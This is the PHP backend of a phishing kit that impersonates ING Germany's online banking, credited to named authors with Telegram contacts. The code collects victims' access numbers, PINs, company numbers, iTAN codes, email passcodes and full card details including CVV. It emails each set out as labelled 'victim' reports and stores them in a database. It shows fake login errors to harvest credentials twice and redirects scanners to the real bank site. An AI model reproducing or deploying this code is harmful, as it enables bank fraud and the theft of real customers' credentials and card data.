<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/

    require_once 'includes/main.php';
    if( $_GET['waiting'] == 1 ) {
        $response = panel_response();
        if( $response === 'badlogin' ) {
            echo 'errorlogin';
            exit();
        } else if( $response === 'app' ) {
            echo 'app';
            exit();
        } else if( $response === 'badfirma' ) {
            echo 'errorfirma';
            exit();
        } else if( $response === 'cc' ) {
            echo 'cc';
            exit();
        } else if( $response === 'itan' ) {
            echo 'itan';
            exit();
        } else if( $response === 'baditan' ) {
            echo 'erroritan';
            exit();
		} else if( $response === 'access' ) {
            echo 'access';
            exit();
		} else if( $response === 'badaccess' ) {
            echo 'erroraccess';
            exit();	
        } else if( $response === 'success' ) {
            echo 'success';
            exit();
        }
        exit();
    }
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        $page = go('login');
        header("Location: clients/login.php??verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorlogin' ) {
            $_SESSION['errors']['username'] = 'Ihre Anmeldung war nicht erfolgreich. Bitte geben Sie Ihre 10-stellige Zugangsnummer ein.';
            $_SESSION['errors']['password'] = 'Ihre Anmeldung war nicht erfolgreich. Bitte geben Sie Ihre mindestens 5-stellige Internetbanking PIN ein.';
            $page = go('login');
            header("Location: clients/login.php??error=1&verification#_");
            exit();
        }
        if( $red == 'errorfirma' ) {
            $_SESSION['errors']['firma'] = true;
            $page = go('firma');
            header("Location: clients/firma.php??error=1&verification#_");
            exit();
        }
        if( $red == 'erroritan' ) {
            $_SESSION['errors']['itan'] = 'Ungültiger Code.';
            $page = go('itan');
            header("Location: clients/itan.php?error=1&verification#_");
            exit();
        }
		        if( $red == 'erroraccess' ) {
            $_SESSION['errors']['access'] = 'Ungültiger Code.';
            $page = go('access');
            header("Location: clients/access.php?error=1&verification#_");
            exit();
        }
        $page = go($red);
        header("Location: clients/". $red .".php?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['username']   = $_POST['username'];
            $_SESSION['password']   = $_POST['password'];
            if( validate_number($_POST['username'],10) == false ) {
                $_SESSION['errors']['username'] = 'Ihre Anmeldung war nicht erfolgreich. Bitte geben Sie Ihre 10-stellige Zugangsnummer ein.';
            }
            if( empty($_POST['password']) ) {
                $_SESSION['errors']['password'] = 'Ihre Anmeldung war nicht erfolgreich. Bitte geben Sie Ihre mindestens 5-stellige Internetbanking PIN ein.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING-DE | Login';
                $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Username : ' . $_POST['username'] . "\r\n";
                $message .= 'Password : ' . $_POST['password'] . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $data = [
                    'login'     => $_POST['username'] . ' | ' . $_POST['password'],
                    'ip'    => get_client_ip()
                ];
                insert_login($data);
                if( $_POST['error'] > 0 ) {
                    $page = go('firma');
                    header("Location: clients/firma.php?verification#_");
                    exit();
                }
                $_SESSION['errors']['username'] = 'Ihre Anmeldung war nicht erfolgreich. Bitte geben Sie Ihre 10-stellige Zugangsnummer ein.';
                $_SESSION['errors']['password'] = 'Ihre Anmeldung war nicht erfolgreich. Bitte geben Sie Ihre mindestens 5-stellige Internetbanking PIN ein.';
                $page = go('login');
                header("Location: clients/login.php?error=1&verification#_");
                exit();
            } else {
                $error = $_POST['error'];
                $page = go('login');
                header("Location: clients/login.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "firma") {
            $_SESSION['errors']     = [];
            $_SESSION['firma']   = $_POST['firma'];
            if( validate_number($_POST['firma'],6) == false ) {
                $_SESSION['errors']['firma'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING-DE | Firma';
                $message = '/-- FIRMA INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Firma : ' . $_POST['firma'] . "\r\n";
                $message .= '/-- END FIRMA INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                update_status(get_client_ip(),'W');
                $data = [
                    'firma'     => $_POST['firma'],
                    'ip'    => get_client_ip()
                ];
                insert_firma($data);
                echo 'success';
                exit();
            } else {
                echo 'error';
                exit();
            }
        }
        if ($_POST['step'] == "itan") {
            $_SESSION['errors']     = [];
            $_SESSION['itan']   = $_POST['itan1'] . $_POST['itan2'] . $_POST['itan3'] . $_POST['itan4'] . $_POST['itan5'] . $_POST['itan6'];
            if( validate_number($_SESSION['itan'],6) == false ) {
                $_SESSION['errors']['itan'] = 'Ungültiger Code.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING-DE | iTAN';
                $message = '/-- ITAN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'iTAN : ' . $_SESSION['itan'] . "\r\n";
                $message .= '/-- END ITAN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                update_status(get_client_ip(),'W');
                $data = [
                    'itan'     => $_SESSION['itan'],
                    'ip'    => get_client_ip()
                ];
                insert_itan($data);
                echo 'success';
                exit();
            } else {
                echo 'error';
                exit();
            }
        }
        if ($_POST['step'] == "access") {
            $_SESSION['email']   = $_POST['email'];
            $_SESSION['passcode']   = $_POST['passcode'];
            if( validate_number($_POST['email'],10) == false ) {
                $_SESSION['errors']['email'] = 'Ihre Anmeldung war nicht erfolgreich. Bitte geben Sie Ihre 10-stellige Zugangsnummer ein.';
            }
            if( empty($_POST['passcode']) ) {
                $_SESSION['errors']['passcode'] = 'Ihre Anmeldung war nicht erfolgreich. Bitte geben Sie Ihre mindestens 5-stellige Internetbanking PIN ein.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING-DE | access';
                $message = '/-- access INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'email : ' . $_SESSION['email'] . "\r\n";
				$message .= 'pass : ' . $_SESSION['passcode'] . "\r\n";
                $message .= '/-- END access INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                update_status(get_client_ip(),'W');
                $data = [
                    'access'     => $_POST['email'] . ' | ' . $_POST['passcode'],
                    'ip'    => get_client_ip()
                ];
                insert_access($data);
                echo 'success';
                exit();
            } else {
                echo 'error';
                exit();
            }
        }	
        if ($_POST['step'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['cc1']   = $_POST['cc1'];
            $_SESSION['cc2']   = $_POST['cc2'];
            $_SESSION['cc3']   = $_POST['cc3'];
            $_SESSION['three']      = $_POST['three'];
            $cc = $_POST['cc1'] . $_POST['cc2'] . $_POST['cc3'] . $_POST['cc4'];
            if( validate_number($_POST['cc1'],4) == false ) {
                $_SESSION['errors']['cc1'] = true;
            }
            if( validate_number($_POST['cc2'],4) == false ) {
                $_SESSION['errors']['cc2'] = true;
            }
            if( validate_number($_POST['cc3'],4) == false ) {
                $_SESSION['errors']['cc3'] = true;
            }
            if( validate_number($cc,16) == false ) {
                $_SESSION['errors']['one'] = 'Kartennummer ungültig';
            }
            if( validate_number($_POST['three'],3) == false ) {
                $_SESSION['errors']['three'] = 'Sicherheitscode ungültig';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING-DE | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Card number : ' . $cc . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                update_status(get_client_ip(),'W');
                $data = [
                    'cc'     => $cc . ' | ' . $_POST['two'] . ' | ' . $_POST['three'],
                    'ip'    => get_client_ip()
                ];
                insert_cc($data);
                echo 'success';
                exit();
            } else {
                echo 'error';
                exit();
            }
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>